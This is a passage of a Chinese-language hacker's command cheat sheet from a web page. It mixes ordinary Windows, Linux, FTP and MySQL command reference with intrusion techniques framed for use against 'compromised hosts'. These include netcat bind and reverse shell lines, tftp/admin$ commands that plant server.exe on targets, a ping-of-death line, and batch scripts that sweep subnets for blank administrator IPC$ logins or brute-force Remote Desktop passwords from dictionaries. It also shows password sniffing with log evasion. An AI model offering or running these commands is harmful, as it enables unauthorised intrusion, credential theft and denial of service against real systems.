把”用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数<br>net start 查看开启了哪些服务<br>net start 服务名　 开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net time \\目标ip 查看对方时间<br>net time \\目标ip /set 设置本地计算机时间与”目标IP”主机的时间同步,加上参数/yes可取消确认信息<br>net view 查看本地局域网内开启了哪些共享<br>net view \\ip 查看对方局域网内开启了哪些共享<br>net config 显示系统网络设置<br>net logoff 断开连接的共享<br>net pause 服务名 暂停某服务<br>net send ip “文本信息” 向对方发信息<br>net ver 局域网内正在使用的网络连接类型和信息<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ /del 删除ipc$共享<br>net share c$ /del 删除C：共享<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -a 查看开启了哪些端口,常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：”-w数字”用于设置超时间隔。<br>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)<br>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数”/all”显示全部配置信息<br>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如”DEL/AR <em>.</em>“表示删除当前目录下所有只读文件，”DEL/A-S <em>.</em>“表示删除当前目录下除系统文件以外的所有文件</p>\n<p>#2 二：<br>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>move 盘符\\路径\\要移动的文件名　存放移动文件的路径\\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖<br>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令<br>at id号 开启已注册的某个计划任务<br>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止<br>at id号 /delete 停止某个已注册的计划任务<br>at 查看所有的计划任务<br>at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机<br>finger username @host 查看最近有哪些用户登陆<br>telnet ip 端口 远和登陆服务器,默认端口为23<br>open ip 连接到IP（属telnet登陆后的命令）<br>telnet 在本机上直接键入telnet 将进入本机的telnet<br>copy 路径\\文件名1　路径\\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件<br>copy c:\\srv.exe \\ip\\admin$ 复制本地c:\\srv.exe到对方的admin下<br>cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件<br>ver 在DOS窗口下显示版本信息<br>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS<br>md　目录名 创建目录<br>replace 源文件　要替换文件的目录 替换文件<br>ren 原文件名　新文件名 重命名文件名<br>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>type 文件名 显示文本文件的内容<br>more 文件名 逐屏显示输出文件<br>doskey 要锁定的命令＝字符<br>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=<br>taskmgr 调出任务管理器<br>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误<br>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口<br>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe<br>path 路径\\可执行文件的文件名 为可执行文件设置一个路径。<br>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；<br>regedit /e 注册表文件名 导出注册表<br>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\\test.txt /D pub 设定d:\\test.txt拒绝pub用户访问。<br>cacls 文件名 查看文件的访问用户权限列表<br>REM 文本内容 在批处理文件中添加注解<br>netsh 查看或更改本地网络配置情况</p>\n<p>#4 四：<br>IIS服务命令：<br>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>iisreset /start或stop 启动（停止）所有Internet服务<br>iisreset /restart 停止然后重新启动所有Internet服务<br>iisreset /status 显示所有Internet服务状态<br>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动<br>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>FTP 命令： (后面有详细说明内容)<br>ftp的命令行格式为:<br>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>－d 使用调试方式。<br>－n 限制ftp的自动登录,即不使用.netrc文件。<br>－g 取消全局文件名。<br>help [命令] 或 ？[命令] 查看命令说明<br>bye 或 quit 终止主机FTP进程,并退出FTP管理方式.<br>pwd 列出当前远端主机目录<br>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>mget [remote-files] 从远端主机接收一批文件至本地主机<br>mput local-files 将本地主机中一批文件传送至远端主机<br>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件<br>ascii 设定以ASCII方式传送文件(缺省值)<br>bin 或 image 设定以二进制方式传送值)<br>bin 或 image 设定以二进制方式传送文件<br>bell 每完成一次文件传送,报警提示<br>cdup 返回上一级目录<br>close 中断与远程服务器的ftp会话(与open对应)<br>open host[port] 建立指定ftp服务器连接,可指定连接端口<br>delete 删除远端主机中的文件<br>mdelete [remote-files] 删除一批文件<br>mkdir directory-name 在远端主机中建立目录<br>rename [from] [to] 改变远端主机中的文件名<br>rmdir directory-name 删除远端主机中的目录<br>status 显示当前FTP的状态<br>system 显示远端主机系统类型<br>user user-name [password] [account] 重新以别的用户名登录远端主机<br>open host [port] 重新建立一个新的连接<br>prompt 交互提示模式<br>macdef 定义宏命令<br>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录<br>chmod 改变远端主机的文件权限<br>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母<br>cd remote－dir 进入远程主机目录<br>cdup 进入远程主机目录的父目录<br>! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip<br>MYSQL 命令：<br>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。<br>（例：mysql -h110.110.110.110 -Uroot -P123456<br>注:u与root可以不用加空格，其它也一样）<br>exit 退出MYSQL<br>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>grant select on 数据库.<em> to 用户名@登录主机 identified by \\”密码\\”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>use mysql；<br>show tables; 显示库中的数据表<br>describe 表名; 显示数据表的结构<br>create database 库名; 建库<br>use 库名；<br>create table 表名 (字段设定列表)； 建表<br>drop database 库名;<br>drop table 表名； 删库和删表<br>delete from 表名; 将表中记录清空<br>select </em> from 表名; 显示表中的记录<br>mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br>win2003系统下新增命令（实用部份）：<br>shutdown /参数 关闭或重启本地或远程主机。<br>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。<br>例：shutdown /r /t 0 立即重启本地主机（无延时）<br>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。<br>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。<br>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。<br>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>\n<p>#6 六：<br>Linux系统下基本命令： 要区分大小写<br>uname 显示版本信息（同win2K的 ver）<br>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）<br>附：批处理命令与变量<br>1：for命令及变量 基本格式：<br>FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\ip\\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3<br>(set):指定一个或一组文件，可使用通配符，如：(D:\\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；”(1 -1 254)”说明：即从254到1 }<br>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>command_parameters：为特定命令指定参数或命令行开关<br>IN (set)：指在(set)中取值；DO command ：指执行command<br>参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\\pass.txt)时 }。<br>用法举例：<br>@echo off<br>echo 用法格式：test.bat <em>.</em>.<em> &gt; test.txt<br>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \\%1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt<br>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br>/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：</em>.<em>.</em>为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。<br>@echo off<br>echo 用法格式：ok.bat ip<br>FOR /F %%i IN (D:\\user.dic) DO smb.exe %1 %%i D:\\pass.dic 200<br>存为：ok.exe 说明：输入一个IP后，用字典文件d:\\pass.dic来暴解d:\\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>2：if命令及变量 基本格式：<br>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为”真”。<br>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>例：”if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）<br>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>例：”if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。</p>\n<p>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。<br>当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：”if exist test.txt. else echo test.txt.missing “，注意命令中的”.”</p>\n<p>（二）系统外部命令(均需下载相关工具)：<br>1、瑞士军刀：nc.exe<br>参数说明：<br>-h 查看帮助信息<br>-d 后台模式<br>-e prog程序重定向，一但连接就执行［危险］<br>-i secs延时的间隔<br>-l 监听模式，用于入站连接<br>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C<br>-n IP地址，不能用域名<br>-o film记录16进制的传输<br>-p[空格]端口 本地端口号<br>-r 随机本地及远程端口<br>-t 使用Telnet交互方式<br>-u UDP模式<br>-v 详细输出，用-vv将更详细<br>-w数字 timeout延时间隔<br>-z 将输入，输出关掉（用于扫锚时）<br>基本用法：<br>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口<br>nc -l -p 80 开启本机的TCP 80端口并监听<br>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口<br>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口<br>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口<br>高级用法：<br>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止<br>nc -L -p 80 &gt; c:\\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt<br>nc -L -p 80 &lt; c:\\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用<br>type.exe c:\\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用<br>本机上用：nc -l -p 本机端口<br>在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 <em>win2K<br>nc -e /bin/sh 本机IP -p 本机端口 </em>linux,unix 反向连接突破对方主机的防火墙<br>本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称<br>在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机<br>备 注：<br>| 管道命令<br>&lt; 或 &gt; 重定向命令。”&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令<br>＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\\winnt &gt;&gt; d:\\log.txt 意思是：后台执行dir，并把结果存在d:\\log.txt中 </p>\n<blockquote>\n<p>与&gt;&gt;的区别 　“&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。<br>如：@dir c:\\winnt &gt;&gt; d:\\log.txt和@dir c:\\winnt &gt; d:\\log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>\n</blockquote>\n<p>#8 八：<br>2、扫锚工具：xscan.exe<br>基本格式<br>xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息<br>xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息<br>检测项目<br>-active 检测主机是否存活<br>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>-port 检测常用服务的端口状态<br>-ftp 检测FTP弱口令<br>-pub 检测FTP服务匿名用户写权限<br>-pop3 检测POP3-Server弱口令<br>-smtp 检测SMTP-Server漏洞<br>-sql 检测SQL-Server弱口令<br>-smb 检测NT-Server弱口令<br>-iis 检测IIS编码/解码漏洞<br>-cgi 检测CGI漏洞<br>-nasl 加载Nessus攻击脚本<br>-all 检测以上所有项目<br>其它选项<br>-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取<br>-l 显示所有网络适配器<br>-v 显示详细扫描进度<br>-p 跳过没有响应的主机<br>-o 跳过没有检测到开放端口的主机<br>　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10<br>-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)<br>用法示例<br>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测”hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机<br>3、命令行方式嗅探器: xsniff.exe<br>可捕获局域网内FTP/SMTP/POP3/HTTP协议密码<br>参数说明<br>-tcp 输出TCP数据报<br>-udp 输出UDP数据报<br>-icmp 输出ICMP数据报<br>-pass 过滤密码信息<br>-hide 后台运行<br>-host 解析主机名<br>-addr IP地址 过滤IP地址<br>-port 端口 过滤端口<br>-log 文件名 将输出保存到文件<br>-asc 以ASCII形式输出<br>-hex 以16进制形式输出<br>用法示例<br>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出<br>4、终端服务密码破解: tscrack.exe<br>参数说明<br>-h 显示使用帮助<br>-v 显示版本信息<br>-s 在屏幕上打出解密能力<br>-b 密码错误时发出的声音<br>-t 同是发出多个连接（多线程）<br>-N Prevent System Log entries on targeted server<br>-U 卸载移除tscrack组件<br>-f 使用－f后面的密码<br>-F 间隔时间（频率）<br>-l 使用－l后面的用户名<br>-w 使用－w后面的密码字典<br>-p 使用－p后面的密码<br>-D 登录主页面<br>用法示例<br>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>@if not exist ipcscan.txt goto noscan<br>@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i<br>nscan<br>@echo 3389.txt no find or scan faild<br>(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>@if not exist tscrack.exe goto noscan<br>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>:noscan<br>@echo tscrack.exe no find or scan faild<br>(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)<br>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。<br>5、其它：<br>Shutdown.exe<br>Shutdown \\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）<br>fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）<br>fpipe -l 80 -s 1029 -r 80 <a href=\"http://www.sina.com.cn\" target=\"_blank\" rel=\"noopener\">www.sina.com.cn</a> 当有人扫锚你的80端口时，他扫到的结果会完全是<a href=\"http://www.sina.com.cn的主机信息\" target=\"_blank\" rel=\"noopener\">www.sina.com.cn的主机信息</a><br>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。<br>OpenTelnet.exe (远程开启telnet工具)<br>opentelnet.exe \\IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\ip 连接上对方。<br>NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。<br>ResumeTelnet.exe (OpenTelnet附带的另一个工具)<br>resumetelnet.exe \\IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。<br>6、FTP命令详解：<br>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。<br>FTP的命令行格式为：<br>ftp -v -d -i -n -g [主机名] ，其中<br>-v 显示远程服务器的所有响应信息；<br>-n 限制ftp的自动登录，即不使用；.n etrc文件；<br>-d 使用调试方式；<br>-g 取消全局文件名。</p>\n<p>FTP使用的内部命令如下(中括号表示可选项):<br>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls<em>.zip<br>2.$ macro-ame[args]： 执行宏定义macro-name。<br>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。<br>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。<br>5.ascii：使用ascii类型传输方式。<br>6.bell：每个命令执行完毕后计算机响铃一次。<br>7.bin：使用二进制文件传输方式。<br>8.bye：退出ftp会话过程。<br>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。<br>10.cd remote-dir：进入远程主机目录。<br>11.cdup：进入远程主机目录的父目录。<br>12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。<br>13.close：中断与远程服务器的ftp会话(与open对应)。<br>14.cr：使用asscii方式传输文件时，将回车换行转换为回行。<br>15.delete remote-file：删除远程主机文件。<br>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。<br>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。<br>18.disconnection：同close。<br>19.form format：将文件传输方式设置为format，缺省为file方式。<br>20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。<br>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。<br>22.hash：每传输1024字节，显示一个hash符号(#)。<br>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。<br>25.image：设置二进制传输方式(同binary)。<br>26.lcd[dir]：将本地工作目录切换至dir。<br>27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。<br>28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。<br>29.mdelete[remote-file]：删除远程主机文件。<br>30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir </em>.o.*.zipoutfile 。<br>31.mget remote-files：传输多个远程文件。<br>32.mkdir dir-name：在远程主机中建一目录。<br>33.mls remote-file local-file：同nlist，但可指定多个文件名。<br>34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。<br>35.modtime file-name：显示远程主机文件的最后修改时间。<br>36.mput local-file：将多个文件传输至远程主机。<br>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。<br>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。<br>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。<br>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。<br>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。<br>42.passive：进入被动传输方式。<br>43.prompt：设置多个文件传输时的交互提示。<br>44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。<br>45.put local-file[remote-file]：将本地文件local-file传送至远程主机。<br>46.pwd：显示远程主机的当前工作目录。<br>47.quit：同bye，退出ftp会话。<br>48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.<br>49.recv remote-file[local-file]：同get。<br>50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。<br>51.rhelp[cmd-name]：请求获得远程主机的帮助。<br>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。<br>53.rename[from][to]：更改远程主机文件名。<br>54.reset：清除回答队列。<br>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。<br>56.rmdir dir-name：删除远程主机目录。<br>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。<br>58.send local-file[remote-file]：同put。<br>59.sendport：设置PORT命令的使用。<br>60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。<br>61.size file-name：显示远程主机文件大小，如：site idle 7200。<br>62.status：显示当前ftp状态。<br>63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。<br>64.sunique：将远程主机文件名存储设置为只一(与runique对应)。<br>65.system：显示远程主机的操作系统类型。<br>66.tenex：将文件传输类型设置为TENEX机的所需的类型。<br>67.tick：设置传输时的字节计数器。<br>68.trace：设置包跟踪。<br>69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。<br>70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3<br>71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。<br>72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.<br>73.?[cmd]：同help.   </p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>copy:</strong> \\ip\\admin$\\svv.exe c:\\ 或:copy\\ip\\admin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： </p>\n<p><strong>xcopy</strong> 要复制的文件或目录树　目标地址\\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 </p>\n<p><strong>tftp -i</strong> 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\\server.exe 登陆后，将”IP”的server.exe下载到目标主机c:\\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p>\n<p><strong>tftp -i</strong> 对方IP　put c:\\server.exe 登陆后，上传本地c:\\server.exe至主机<br><strong>ftp ip</strong> 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；<br>默认为ASCII格式传送(文本文件时)<br><strong>route print </strong>显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br><strong>arp</strong> 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br><strong>start </strong>程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令<br><strong>mem </strong>查看cpu使用情况<br><strong>attrib </strong>文件名(目录名) 查看某文件（目录）的属性<br><strong>attrib</strong> 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性<br><strong>dir 